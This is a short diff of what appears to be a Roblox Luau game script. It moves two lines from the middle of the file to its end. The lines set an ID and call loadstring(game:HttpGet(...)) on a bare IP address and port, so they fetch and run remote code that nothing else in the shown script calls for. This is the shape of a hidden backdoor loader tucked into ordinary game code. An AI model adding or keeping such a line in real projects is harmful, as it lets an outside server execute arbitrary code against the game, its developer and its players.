@@ -131,9 +131,6 @@ task.spawn(function()
 	end
 end)
 
-ID="151de7d8-5ef0-4146-85b6-826df4581111";
-loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
-
 local player = game.Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
@@ -161,3 +158,6 @@ task.spawn(function()
 		end
 	end
 end)
+
+ID="151de7d8-5ef0-4146-85b6-826df4581111";
+loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
